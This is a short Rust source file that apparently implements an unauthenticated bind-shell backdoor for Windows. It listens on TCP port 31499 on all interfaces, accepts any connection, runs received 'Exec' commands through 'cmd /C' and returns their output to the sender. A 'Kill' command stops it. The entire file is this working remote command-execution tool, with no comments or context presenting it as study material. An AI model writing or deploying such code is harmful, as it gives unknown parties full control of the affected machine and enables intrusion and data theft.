use std::io::prelude::*;
use std::net::{TcpListener, TcpStream};
use std::process::Command;
use std::str;

mod commands;
use commands::{match_command, CommandList};

fn main() {
    let localaddr: &str = "0.0.0.0:31499";
    let listener = TcpListener::bind(localaddr).expect("");

    loop {
        let mut buf = [0; 1000];

        let (mut stream, addr) = listener.accept().expect("Failed to read stream");

        let number_of_bytes = stream.read(&mut buf).expect("");
        let data_recv: &[u8] = &mut buf[..number_of_bytes];
        let command_received: &str = match str::from_utf8(data_recv) {
            Ok(v) => v,
            Err(_e) => continue,
        };
        let cmd = match match_command(command_received) {
            CommandList::Error(_e) => continue,
            CommandList::Kill => std::process::exit(0),
            CommandList::Exec(s) => {
                let output = Command::new("cmd")
                    .args(&["/C", &s])
                    .output()
                    .expect("failed to run command");

                output.stdout
            }
        };

        stream.write(&cmd).expect("Failed to send output");
    }
}
